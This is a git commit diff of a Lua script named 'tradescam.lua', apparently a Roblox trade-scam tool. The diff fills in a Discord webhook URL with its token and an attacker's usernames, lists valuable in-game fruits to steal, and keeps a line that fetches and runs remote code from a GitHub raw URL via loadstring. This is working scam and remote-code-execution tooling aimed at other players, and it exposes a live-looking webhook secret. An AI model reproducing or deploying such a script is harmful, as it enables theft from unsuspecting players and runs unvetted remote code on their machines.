9c8e41f8d0a5d97aeabd2cf3aa30a90a326c577d
wazure-dev <damongacad04@gmail.com>
2025-04-30 17:30:36 +0900

    tradescam.lua

--- tradescam.lua
+++ tradescam.lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+Webhook = "https://discord.com/api/webhooks/1367054734179041301/OhRHq-4cBj7FJU_ljbmYKY9_imgSe6ORcGTNO8f1Flpm2FN0Fqvkpz0Z7SGVbrQwT_bT" -- << Your Webhook
+Usernames = {"godswoy13", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
